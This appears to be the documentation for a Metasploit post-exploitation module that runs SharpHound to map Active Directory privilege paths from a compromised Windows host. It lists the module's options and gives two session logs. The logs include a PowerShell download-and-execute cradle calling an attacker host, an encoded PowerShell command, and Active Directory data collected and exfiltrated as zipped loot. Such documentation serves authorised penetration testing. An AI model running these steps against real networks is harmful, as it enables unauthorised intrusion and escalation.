## Vulnerable Application

This module will execute the BloodHound C# Ingestor (aka SharpHound) to gather sessions, local admin, domain trusts and more.
With this information BloodHound will easily identify highly complex privilege elevation attack paths that would otherwise be
impossible to quickly identify within an Active Directory environment.

This module can take several/many minutes to run due to the volume of data being collected.

## Verification Steps

  1. Start `msfconsole`
  2. Get meterpreter session on a Windows domain
  3. Do: `use post/windows/gather/bloodhound`
  4. Do: `set SESSION <session id>`
  5. Do: `run`
  6. You should be able to see that the module is running a powershell in the target machine
  7. You should be able to see, after few minutes, that the module created a loot with the BloodHound results in zip format

## Options

### Method

Which method to use to get shaphound running.  Default is `download`.

  1. `download` requires the compromised host to have connectivity back to metasploit to download and execute the
      payload.  Sharphound is not written to disk.
  2. `disk` requires admin privileges to bypass the execution policy (if it isn't open).  Writes the `sharphound.exe`
     file to disk.  No connectivity is required but a disk write does happen which is likely to get caught by AV.

### CollectionMethode

The collection method to use. Accepted values are `Default`, `Group`,
`LocalAdmin`, `RDP`, `DCOM`, `GPOLocalGroup`, `Session`, `ObjectProps`, `ComputerOnly`, `LoggedOn`, `Trusts`, `ACL`, `Container`,
`DcOnly`, `All`.  The default method is `Default`.

### Domain

Specifies the domain to enumerate. If not specified, will enumerate the current domain your user context specifies.

### Stealth

Use stealth collection options, will sacrifice data quality in favor of much reduced network impact. The default value is `false`.

### ExcludeDomainControllers

Exclude domain controllers from session queries. Useful for ATA environments which detect this behavior. The default value is `false`.

### DomainController

Specify which Domain Controller to request data from. Defaults to closest DC using Site Names.

### LdapPort

Override the port used to connect to LDAP.

### SecureLdap

Uses LDAPs instead of unencrypted LDAP on port 636. The default value is `false`.

### DisableKerbSigning

Disables Kerberos Signing on requests. The default value is `false`.


### OutputFolder

Folder to write the JSON output to.  Default is to enumerate the Windows Temp folder.

### EncryptZip

If the zip should be encrypted by SharpHound using a random password.  Password is stored to `notes`, default is `true`.

### NoSaveCache

If the cache file (.bin) should NOT be written to disk.  Default is `true`.

## Scenarios

### Windows 2012 Domain Controller, Download method

```
msf6 post(windows/gather/bloodhound) > run

[*] Using URL: http://1.1.1.1:8080/127mPhBr3dZ
[*] Loading BloodHound with: IEX (new-object net.webclient).downloadstring('http://1.1.1.1:8080/127mPhBr3dZ')
[*] Invoking BloodHound with: Invoke-BloodHound -OutputDirectory "C:\Users\ADMINI~1\AppData\Local\Temp" -ZipFileName isid -MemCache -ZipPassword ilvtbfgkcmwszdxjn 
[*] 2022-11-13T13:45:21.0298446-05:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
[*] 2022-11-13T13:45:21.4198615-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
[*] 2022-11-13T13:45:21.4666492-05:00|INFORMATION|Initializing SharpHound at 1:45 PM on 11/13/2022
[*] 2022-11-13T13:45:22.2154647-05:00|INFORMATION|Loaded cache with stats: 59 ID to type mappings.
[*]  59 name to SID mappings.
[*]  0 machine sid mappings.
[*]  2 sid to domain mappings.
[*]  0 global catalog mappings.
[*] 2022-11-13T13:45:22.2310827-05:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
[*] 2022-11-13T13:45:22.6054639-05:00|INFORMATION|Beginning LDAP search for hoodiecola.com
[*] 2022-11-13T13:45:22.7458626-05:00|INFORMATION|Producer has finished, closing LDAP channel
[*] 2022-11-13T13:45:22.7614632-05:00|INFORMATION|LDAP channel closed, waiting for consumers
[*] 2022-11-13T13:45:53.5431310-05:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 87 MB RAM
[*] 2022-11-13T13:46:06.1354911-05:00|INFORMATION|Consumers finished, closing output channel
[*] 2022-11-13T13:46:06.2134955-05:00|INFORMATION|Output channel closed, waiting for output task to complete
[*] Closing writers
[*] 2022-11-13T13:46:06.5255088-05:00|INFORMATION|Status: 100 objects finished (+100 2.325581)/s -- Using 89 MB RAM
[*] 2022-11-13T13:46:06.5255088-05:00|INFORMATION|Enumeration finished in 00:00:43.9260652
[*] 2022-11-13T13:46:06.7283096-05:00|INFORMATION|Saving cache with stats: 59 ID to type mappings.
[*]  59 name to SID mappings.
[*]  0 machine sid mappings.
[*]  2 sid to domain mappings.
[*]  0 global catalog mappings.
[*] 2022-11-13T13:46:06.7439000-05:00|INFORMATION|SharpHound Enumeration Completed at 1:46 PM on 11/13/2022! Happy Graphing!
[+] Downloaded C:\Users\ADMINI~1\AppData\Local\Temp\20221113134605_isid.zip: /root/.msf4/loot/20221113141655_default_2.2.2.2_windows.ad.blood_027677.zip
[+] Zip password: ilvtbfgkcmwszdxjn
[*] Post module execution completed
```

### Windows 10 non-AD host, Windows Server 2012 AD, Disk Method

```
meterpreter > sysinfo
Computer        : WIN10PROLICENSE
OS              : Windows 10 (10.0 Build 16299).
Architecture    : x64
System Language : en_US
Domain          : hoodiecola
Logged On Users : 7
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 1...
msf5 post(windows/gather/bloodhound) > set method disk
method => disk
msf5 post(windows/gather/bloodhound) > exploit

[*] Uploading sharphound.exe as C:\Users\user\Desktop\qehojlwml.exe
[*] Loading BloodHound with: . C:\Users\user\Desktop\qehojlwml.exe --outputdirectory "C:\Users\user\AppData\Local\Temp" --zipfilename eiqxerh --encryptzip --nosavecache 
[+] EXECUTING:
powershell.exe -EncodedCommand LgAgAEMAOgBcAFUAcwBlAHIAcwBcAHQAYQByAGEAXABEAGUAcwBrAHQAbwBwAFwAcQBlAGgAbwBqAGwAdwBtAGwALgBlAHgAZQAgAC0ALQBvAHUAdABwAHUAdABkAGkAcgBlAGMAdABvAHIAeQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAdABhAHIAYQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwACIAIAAtAC0AegBpAHAAZgBpAGwAZQBuAGEAbQBlACAAZQBpAHEAeABlAHIAaAAgAC0ALQBlAG4AYwByAHkAcAB0AHoAaQBwACAALQAtAG4AbwBzAGEAdgBlAGMAYQBjAGgAZQAgADsAIAA= -InputFormat None
[*] ----------------------------------------------
[*] Initializing SharpHound at 4:19 PM on 6/3/2020
[*] ----------------------------------------------
[*] 
[*] Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
[*] 
[*] [+] Creating Schema map for domain HOODIECOLA.COM using path CN=Schema,CN=Configuration,DC=HOODIECOLA,DC=COM
[*] [+] Cache File not Found: 0 Objects in cache
[*] 
[*] [+] Pre-populating Domain Controller SIDS
[*] Status: 0 objects finished (+0) -- Using 19 MB RAM
[*] Status: 63 objects finished (+63 21)/s -- Using 26 MB RAM
[*] Enumeration finished in 00:00:03.3219377
[*] Compressing data to C:\Users\user\AppData\Local\Temp\20200603161905_eiqxerh.zip
[*] Password for Zip file is QEqUpTtU0v. Unzip files manually to upload to interface
[*] 
[*] SharpHound Enumeration Completed at 4:19 PM on 6/3/2020! Happy Graphing!
[*] 
[+] Downloaded C:\Users\user\AppData\Local\Temp\20200603161905_eiqxerh.zip: /metasploit/.msf4/loot/20200603192705_default_2.2.2.2_windows.ad.blood_749446.zip
[+] Zip password: QEqUpTtU0v
[*] Deleting C:\Users\user\Desktop\qehojlwml.exe
[*] Post module execution completed

msf5 post(windows/gather/bloodhound) > notes

Notes
=====

 Time                     Host          Service  Port  Protocol  Type                     Data
 ----                     ----          -------  ----  --------  ----                     ----
 2020-06-03 23:27:05 UTC  2.2.2.2                           Sharphound Zip Password  "Bloodhound/Sharphound loot /metasploit/.msf4/loot/20200603192705_default_2.2.2.2_windows.ad.blood_749446.zip password is QEqUpTtU0v"

```
